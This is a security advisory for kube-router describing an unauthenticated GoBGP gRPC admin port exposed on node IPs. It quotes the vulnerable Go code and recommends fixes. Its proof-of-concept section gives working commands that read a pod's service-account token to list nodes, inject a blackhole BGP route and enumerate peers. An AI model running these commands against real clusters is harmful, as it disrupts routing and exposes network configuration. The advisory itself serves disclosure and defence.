# [M] kube-router: GoBGP gRPC Admin Port Exposed on Node Primary IP Without Authentication, Allowing Cluster-Wide BGP Route Injection

## Summary
Severity: Medium
Advisory: GHSA-v5mh-h5hx-7v92
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-v5mh-h5hx-7v92
Type: github-advisory

## Affected
- Go: `github.com/cloudnativelabs/kube-router` — affected >=0 <2.9.0

## Details
## Summary

When the kube-router routing controller starts (`--run-router`), it binds the GoBGP gRPC management server to the node's primary IP (e.g., `192.168.1.10:50051`) in addition to `127.0.0.1:50051`. The default admin port is `50051` and the server is enabled by default with no TLS and no authentication. Any pod in the cluster can reach node IPs and therefore call the GoBGP gRPC API to inject arbitrary BGP routes, enumerate peer configurations, add unauthorized BGP neighbors, or withdraw legitimate routes. While kube-router's BGP export policy of `ROUTE_ACTION_REJECT` limits the attack surface to the local node's GoBGP RIB, an attacker can still impact local routing decisions.

## Details

The gRPC server is started unconditionally when `--run-router` is active. In `pkg/controllers/routing/network_routes_controller.go`, the `startBgpServer(true)` call at line 365 passes `grpcServer=true`, and the binding logic at lines 1057–1061 is:

```go
// pkg/controllers/routing/network_routes_controller.go:1057-1061
if grpcServer && nrc.goBGPAdminPort != 0 {
    nrc.bgpServer = gobgp.NewBgpServer(
        gobgp.GrpcListenAddress(net.JoinHostPort(nrc.krNode.GetPrimaryNodeIP().String(),
            strconv.FormatUint(uint64(nrc.goBGPAdminPort), 10)) + "," +
            fmt.Sprintf("127.0.0.1:%d", nrc.goBGPAdminPort)))
}
```

The default admin port is defined in `pkg/options/options.go`:

```go
// pkg/options/options.go:16
defaultGoBGPAdminPort uint16 = 50051
```

No `gobgp.GrpcOption` is passed, meaning the gRPC server is started with no TLS credentials and no authentication interceptor. The GoBGP gRPC API (`gobgpapi`) exposes write-capable RPCs:

- `AddPath` / `DeletePath` — inject or withdraw arbitrary BGP routes
- `AddPeer` / `DeletePeer` / `UpdatePeer` — add/remove/modify BGP neighbors
- `AddPolicy` / `DeletePolicy` — modify BGP routing policies
- `ListPeer` / `ListPath` — enumerate all BGP peer configs and routing table entries

kube-router runs as a DaemonSet with `hostNetwork: true`. This means the gRPC server is reachable at `<node-primary-ip>:50051` from any pod in the cluster — pod-to-node-IP connectivity is guaranteed by any Kubernetes-conformant CNI. The kube-router documentation in `docs/pod-toolbox.md` explicitly demonstrates cross-node usage: "To query a different node use `gobgp --host node02.mydomain`" — confirming the port is reachable across the cluster, but providing no guidance on restricting access.

## PoC

From any pod running in the cluster:

**Step 1 — Discover a node IP:**
```bash
# Using the Kubernetes API (available to all pods via service account)
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/nodes \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  | grep -o '"internalIP":"[^"]*"' | head -1
# Expected output: "internalIP":"192.168.1.10"
```

**Step 2 — Connect to the GoBGP gRPC API and inject a blackhole route:**
```bash
# Install gobgp CLI (already available in kube-router image, or pull separately)
gobgp --host 192.168.1.10:50051 global rib add -a ipv4 10.96.0.0/12 nexthop blackhole
# Expected output: (no error — route accepted into the local GoBGP RIB)
```

**Step 3 — Verify route propagated to BGP table:**
```bash
gobgp --host 192.168.1.10:50051 global rib -a ipv4
# Expected output: shows 10.96.0.0/12 blackhole route in the local RIB
# This route does NOT propagate to peers or get added to the kernel routing table.
```

**Step 4 — Enumerate BGP peer configurations:**
```bash
gobgp --host 192.168.1.10:50051 neighbor
# Expected output: lists all configured BGP peers, their ASNs,
# session state, and configuration — without any Kubernetes credentials
```

## Impact

- **BGP route injection**: An attacker with a pod in the cluster can inject arbitrary routes into a node's local BGP RIB. While these routes are not propagated to the rest of the cluster or injected into the kernel's routing table, this allows an attacker to pollute the BGP state on a node and could be combined with misconfigurations/other vulnerabilities for additional exploits (e.g. if the `ROUTE_ACTION_REJECT` policy set in kube-router was ever changed/relaxed)
- **BGP peer enumeration**: All BGP neighbor configurations, including remote ASNs and session metadata, are accessible without authentication.
- **BGP peer manipulation**: Unauthorized BGP peers can be added, and are persisted until manually removed. Legitimate peer configurations can be removed temporarily, though they are automatically restored each sync tick.) 
- **Routing policy modification**: BGP import/export policies can be modified within the local RIB

The blast radius is cluster-wide: a single successful `AddPath` call on one node affects all pods' network connectivity through iBGP propagation.

## Recommended Fix

The gRPC server should not be bound to the node's primary IP by default. Options in order of preference:

1. **Bind to localhost only** (minimal change, immediate security improvement):
```go
// pkg/controllers/routing/network_routes_controller.go:1057-1061
if grpcServer && nrc.goBGPAdminPort != 0 {
    nrc.bgpServer = gobgp.NewBgpServer(
        gobgp.GrpcListenAddress(fmt.Sprintf("127.0.0.1:%d", nrc.goBGPAdminPort)))
}
```

2. **Disable by default** — change `defaultGoBGPAdminPort` from `50051` to `0`, requiring operators to explicitly opt in with `--gobgp-admin-port=50051` and accept responsibility for securing the port.

3. **Add mTLS authentication** — pass `gobgp.GrpcOption(grpc.Creds(...))` to require client certificates before allowing gRPC calls.

For users on affected versions, mitigation options include:
- Set `--gobgp-admin-port=0` to disable the gRPC server entirely
- Add host-level iptables INPUT rules to block port 50051 from non-localhost sources
- Apply Kubernetes NetworkPolicy (note: NodePort/host-network traffic bypasses NetworkPolicy in many CNI implementations)

## References
- https://github.com/cloudnativelabs/kube-router/security/advisories/GHSA-v5mh-h5hx-7v92
- https://github.com/cloudnativelabs/kube-router
